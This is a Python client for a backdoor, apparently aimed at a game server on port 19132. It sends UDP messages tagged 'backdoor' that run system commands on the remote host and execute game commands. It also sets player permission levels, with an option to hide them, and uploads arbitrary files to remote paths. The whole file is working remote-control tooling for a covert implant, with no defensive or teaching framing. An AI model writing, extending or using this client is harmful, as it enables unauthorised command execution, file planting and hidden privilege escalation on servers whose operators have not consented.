import socket
import random
import os
import threading
import time

file_offset = 0
freeze = False

def get_udp_socket(loc_port=random.randint(1024, 65535), timeout: int=1, use_ipv6: bool=False, loc_addr: str="") -> socket.socket:
    if not loc_port:
        loc_port = random.randint(1024, 65535)
    if use_ipv6:
        sockets = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    else:
        sockets = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if timeout:
        sockets.settimeout(timeout)
    sockets.bind((loc_addr, loc_port))
    return sockets

def recv_msg(sk: socket.socket) -> str:
    try:
        msg = sk.recvfrom(1600)[0].decode("gbk")
        if msg.startswith("backdoor "):
            return msg[9:]
        else:
            return ""
    except socket.timeout:
        return ""

def upload_file_recv(sk: socket.socket, file):
    global file_offset, freeze
    while True:
        msg = recv_msg(sk)
        if msg.startswith("set_offset"):
            # freeze = True
            file.seek(int(msg[11:]))
            file_offset = int(msg[11:])
        elif msg.startswith("end"):
            break

def upload_file(local_path: str, remote_path: str, sk: socket.socket, target: tuple[str, int]):
    global file_offset, freeze
    if os.path.exists(local_path):
        file_size = os.path.getsize(local_path)
        file_info = f"{file_size.__str__().ljust(20)} {remote_path}"
        start_msg = f"backdoor upload {'-1'.ljust(20)} {file_info}\0".encode("gbk")
        sk.sendto(start_msg, target)

        ret_msg = recv_msg(sk)
        if ret_msg:
            print(f"{ret_msg}")
            if ret_msg.endswith("failed!"):
                return
        else:
            print("Connection timeout, please try again!")
            return

        file_data = b' '
        data_size = 1500
        pkt_num = 0
        with open(local_path, 'rb') as file:
            t = threading.Thread(target=upload_file_recv, args=(sk, file), daemon=True)
            t.start()
            while data_size == 1500:
                if freeze:
                    time.sleep(0.5)
                    freeze = True
                if file_offset + data_size > file_size:
                    data_size = file_size - file_offset
                file_data = file.read(data_size)
                data = f"backdoor upload {file_offset.__str__().ljust(20)} {data_size.__str__().ljust(4)} ".encode("gbk") + file_data
                sk.sendto(data, target)
                file_offset = file.tell()
                pkt_num += 1
        print(pkt_num)

        data = f"backdoor upload {'-2'.ljust(20)}\0".encode("gbk")
        sk.sendto(data, target)
        file_offset = 0
    time.sleep(1)

if __name__ == "__main__":
    sk = get_udp_socket()
    #addr_str = "127.0.0.1 19132"
    addr_str = input("Please input server ip port like 127.0.0.1 19132\n")
    addr = addr_str.split(" ")
    target = (addr[0], int(addr[1]))
    print("backdoor client. Type q to quit")
    print("scmd [cmd] - execute system command")
    print("gcmd [cmd] - execute game command")
    print("perm [player name] [level: 0~3] [0: hide | 1: display] - set player permission level")
    print("upload [local path] [remote path] - sendfile to server")
    while True:
        cmd = input(">>> ")
        if cmd == "q":
            break
        # prevent invalid user command input
        if not any(cmd.startswith(f"{x} ") for x in ['scmd', 'gcmd', 'perm', 'upload']):
            continue
        if cmd.startswith("upload "):
            local_path = cmd.split()[1]
            remote_path = cmd.split()[2]
            sk.close()
            sk = get_udp_socket()
            upload_file(local_path, remote_path, sk, target)
        else:
            sk.sendto(f"backdoor {cmd}\0".encode(), target)
            print(f"{recv_msg(sk)}")
